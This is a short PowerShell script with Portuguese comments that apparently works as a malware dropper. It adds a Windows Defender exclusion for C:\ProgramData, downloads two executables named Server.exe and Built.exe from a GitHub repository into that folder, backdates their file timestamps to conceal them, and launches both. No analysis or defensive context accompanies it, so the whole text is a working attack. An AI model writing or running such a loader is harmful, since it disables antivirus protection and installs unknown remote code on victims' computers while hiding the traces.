# Adicionar exclusão do ProgramData no Windows Defender
Add-MpPreference -ExclusionPath "C:\ProgramData"

# Baixar arquivos
Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Server.exe" -OutFile "C:\ProgramData\Server.exe"
Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Built.exe" -OutFile "C:\ProgramData\Built.exe"

# Alterar data de modificação para 2025
(Get-Item "C:\ProgramData\Server.exe" ).LastWriteTime = "01/01/2025 00:00:00"
(Get-Item "C:\ProgramData\Server.exe").CreationTime = "01/01/2025 00:00:00"

(Get-Item "C:\ProgramData\Built.exe").LastWriteTime = "01/01/2025 00:00:00"
(Get-Item "C:\ProgramData\Built.exe").CreationTime = "01/01/2025 00:00:00"

# Executar ambos
Start-Process "C:\ProgramData\Server.exe"
Start-Process "C:\ProgramData\Built.exe"
